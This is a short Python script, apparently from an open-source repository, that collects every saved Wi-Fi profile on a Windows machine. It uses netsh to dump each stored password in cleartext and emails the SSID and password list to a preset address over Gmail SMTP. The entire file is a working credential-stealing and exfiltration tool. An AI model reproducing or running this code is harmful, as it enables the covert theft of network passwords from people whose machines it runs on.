#  Copyright (c) 2019. - ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import subprocess, smtplib, re, smtp_info


smtp_info = smtp_info.SMTP_Info

# Note: Command for Windows

def send_mail(message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(smtp_info.sender_email, smtp_info.sender_email_pass)
    server.sendmail(smtp_info.sender_email, smtp_info.recipient_email, message)
    server.quit()


show_networks_cmd = "netsh wlan show profile"
networks = subprocess.check_output(show_networks_cmd, shell=True)
network_names_list = re.findall(br"(?:Profile\s*:\s)(.*)", networks)

results = []
for ssid in network_names_list:
    get_password_cmd = 'netsh wlan show profile ' + 'name=' + '"' + ssid.decode('utf-8') + '"' + ' key=clear'
    ssid_info = subprocess.check_output(get_password_cmd, shell=True)
    clear_password = re.findall(br"(?:Key Content\s*:\s)(.*)", ssid_info)

    try:
        clear_password = clear_password[0].decode('utf-8')
    except IndexError:
        clear_password = "No Password"

    results.append({"ssid": ssid, "password": clear_password})

results_string = ""
i = 0
while i < len(results):
    results_string += results[i].get('ssid') + " >> " + results[i].get('password') + "\n"
    i += 1

send_mail(results_string)
